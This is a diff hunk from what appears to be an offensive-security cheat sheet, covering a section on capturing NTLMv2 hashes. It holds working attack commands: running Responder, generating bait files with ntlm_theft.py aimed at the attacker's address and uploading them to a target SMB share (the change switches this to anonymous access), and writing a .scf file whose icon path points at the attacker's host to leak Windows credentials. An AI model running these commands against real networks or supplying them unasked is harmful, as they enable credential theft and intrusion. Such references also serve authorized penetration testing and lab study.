@@ -929,7 +929,7 @@ mkdir smb; smbclient //$TARGET/$SHARE -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd sm
 
 +---------- Capture NTLMv2 ----------+
 sudo responder -I tun0 -v
-ntlm_theft.py --generate all -s $MYIP -f file; smbclient //$TARGET/SHARENAME -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd file; recurse; prompt; mput *'
+ntlm_theft.py --generate all -s $MYIP -f file; smbclient //$TARGET/'SHARE NAME' -D 'DIRECTORY/FOLDER' -U 'anonymous'%'' -c 'lcd file; recurse; prompt; mput *'
 echo -n '[shell]\nCommand=2\nIconFile=\\$MYIP\\responder\\t.ico\n[Taskbar]\nCommand=ToggleDesktop' > file.scf
 
 +---------- NTDS ----------+
